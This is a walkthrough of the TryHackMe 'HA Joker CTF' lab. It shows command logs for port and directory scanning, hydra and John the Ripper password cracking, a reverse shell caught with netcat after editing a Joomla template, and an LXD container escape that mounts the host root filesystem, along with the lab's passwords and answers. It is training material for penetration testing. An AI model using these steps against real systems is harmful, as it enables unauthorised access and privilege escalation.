# HA Joker CTF

Batman hits Joker.

[HA Joker CTF](https://tryhackme.com/room/jokerctf)

## Topic's

- Network Enumeration
- Web Enumeration
- Brute Forcing (http-get)
- Backup Poking
- Brute Forcing (Zip)
- Stored Passwords & Keys
- SQL Enumeration
- Brute Forcing (Hash)
- Exploitation (LXC)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 HA Joker CTF

We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

**Enumerate Services**

- Nmap

**Bruteforce**

- Performing Bruteforce on files over http
- Performing Bruteforce on Basic Authentication

**Hash Crack**

- Performing Bruteforce on hash to crack zip file
- Performing Bruteforce on hash to crack mysql user

**Exploitation**

- Getting a reverse connection
- Spawning a TTY Shell

**Privilege Escalation**

- Get root taking advantage of flaws in LXD

---

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ sudo nmap -p- -sS -sC -sV -O 10.10.252.64
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 19:57 CEST
Nmap scan report for 10.10.252.64
Host is up (0.034s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/8%OT=22%CT=1%CU=38238%PV=Y%DS=2%DC=I%G=Y%TM=5F7F533
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.49 seconds
```

1. Enumerate services on target machine.

1. What version of Apache is it?

> 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))

`2.4.29`

2. What port on this machine not need to be authenticated by user and password?

```
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
```

`80`

3. There is a file on this port that seems to be secret, what is it?

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.252.64 -x txt,php,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.252.64
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2020/10/08 20:03:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/css (Status: 301)
/img (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/phpinfo.php (Status: 200)
/phpinfo.php (Status: 200)
/secret.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/10/08 20:05:04 Finished
===============================================================
```

`secret.txt`

5. There is another file which reveals information of the backend, what is it?

`phpinfo.php`

1. When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?

- [http://10.10.252.64/secret.txt](http://10.10.252.64/secret.txt)

```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

2. What port on this machine need to be authenticated by Basic Authentication Mechanism?

```
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
```

3. At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.252.64 -m / http-get
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-08 20:10:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.252.64:8080/
[8080][http-get] host: 10.10.252.64   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-08 20:10:47
```

`hannah`

5.  Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

- [http://10.10.252.64:8080/robots.txt](http://10.10.252.64:8080/robots.txt)

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

`/administrator/`

1.  We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ gobuster dir -U joker -P hannah -u http://10.10.252.64:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.252.64:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Auth User:      joker
[+] Extensions:     gz,tgz,zip,7z,bak,old,tar
[+] Timeout:        10s
===============================================================
2020/10/08 20:33:58 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.tgz (Status: 403)
/.hta.zip (Status: 403)
/.hta.7z (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.hta.tar (Status: 403)
/.hta.gz (Status: 403)
/.htaccess (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.gz (Status: 403)
/.htaccess.tgz (Status: 403)
/.htaccess.zip (Status: 403)
/.htaccess.7z (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.gz (Status: 403)
/.htpasswd.tgz (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.7z (Status: 403)
/LICENSE (Status: 200)
/README (Status: 200)
/administrator (Status: 301)
/bin (Status: 301)
/backup (Status: 200)
/backup.zip (Status: 200)
/cache (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/08 20:35:44 Finished
===============================================================
```

```
backup.zip
```

2.  We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ zip2john backup.zip > backup.hash
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hannah           (backup.zip)
1g 0:00:00:00 DONE 2/3 (2020-10-08 20:19) 6.250g/s 501856p/s 501856c/s 501856C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`hannah`

3.  Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

[configuration.php](configuration.php)

```php
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = '1234';
	public $db = 'joomladb';
	public $dbprefix = 'cc1gr_';
```

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep CREATE TABLE db/joomladb.sql | grep user
grep: TABLE: No such file or directory
db/joomladb.sql:CREATE TABLE `cc1gr_user_keys` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_notes` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_profiles` (
db/joomladb.sql:CREATE TABLE `cc1gr_user_usergroup_map` (
db/joomladb.sql:CREATE TABLE `cc1gr_usergroups` (
db/joomladb.sql:CREATE TABLE `cc1gr_users` (
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ grep cc1gr_users db/joomladb.sql
-- Table structure for table `cc1gr_users`
DROP TABLE IF EXISTS `cc1gr_users`;
CREATE TABLE `cc1gr_users` (
-- Dumping data for table `cc1gr_users`
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
kali@kali:~/CTFs/tryhackme/HA Joker CTF$
```

`admin`

5.  Super Duper User! What is the password?

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ john admin.hash /usr/share/wordlists/rockyou.txt --format=bcrypt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
abcd1234         (?)
1g 0:00:00:09 DONE 2/3 (2020-10-08 20:39) 0.1076g/s 79.44p/s 79.44c/s 79.44C/s yellow..allison
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~/CTFs/tryhackme/HA Joker CTF$
```

`abcd1234`

7.  At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

[http://10.10.252.64:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D](http://10.10.252.64:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D)

![](2020-10-08_20-43.png)

[http://10.10.252.64:8080/templates/beez3/error.php](http://10.10.252.64:8080/templates/beez3/error.php)

```
kali@kali:~/CTFs/tryhackme/HA Joker CTF$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.252.64] 43184
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:46:07 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
/bin/sh: 0: can't access tty; job control turned off
$
```

`www-data`

8.  This user belongs to a group that differs on your own group, What is this group?

`lxd`

10. Spawn a tty shell.

`SHELL=/bin/bash script -q /dev/null`

11. In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it online".

[https://linuxcontainers.org/lxd/introduction/](https://linuxcontainers.org/lxd/introduction/)

13. Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.

```
www-data@ubuntu:/$ cd ~
cd ~
www-data@ubuntu:/var/www$ wget http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz
<.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz
--2020-10-08 11:58:36--  http://10.8.106.222/alpine-v3.12-x86_64-20201008_2055.tar.gz
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3183740 (3.0M) [application/gzip]
Saving to: 'alpine-v3.12-x86_64-20201008_2055.tar.gz'
2020-10-08 11:58:38 (1.56 MB/s) - 'alpine-v3.12-x86_64-20201008_2055.tar.gz' saved [3183740/3183740]
www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine
<v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine
www-data@ubuntu:/var/www$ lxc image list
lxc image list
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myalpine | f2a9284c04f4 | no     | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
www-data@ubuntu:/var/www$
```

14. The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.

```
www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine
<-v3.12-x86_64-20200623_1255.tar.gz --alias myalpine
Error: open alpine-v3.12-x86_64-20200623_1255.tar.gz: no such file or directory
www-data@ubuntu:/var/www$ ls
ls
alpine-v3.12-x86_64-20201008_2055.tar.gz  html
www-data@ubuntu:/var/www$ lxc image import alpine-v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine
<v3.12-x86_64-20201008_2055.tar.gz  --alias myalpine
www-data@ubuntu:/var/www$ lxc image list
lxc image list
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myalpine | f2a9284c04f4 | no     | alpine v3.12 (20201008_20:55) | x86_64 | 3.04MB | Oct 8, 2020 at 6:59pm (UTC) |
+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
www-data@ubuntu:/var/www$ lxc init myalpine joker -c security.privileged=true
lxc init myalpine joker -c security.privileged=true
Creating joker
www-data@ubuntu:/var/www$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to joker
www-data@ubuntu:/var/www$ lxc start joker
lxc start joker
www-data@ubuntu:/var/www$ lxc exec joker /bin/sh
lxc exec joker /bin/sh
```

15. What is the name of the file in the /root directory?

```
~ # ^[[26;5Rcat /mnt/root/root/final.txt
cat /mnt/root/root/final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
~ # ^[[26;5R
```
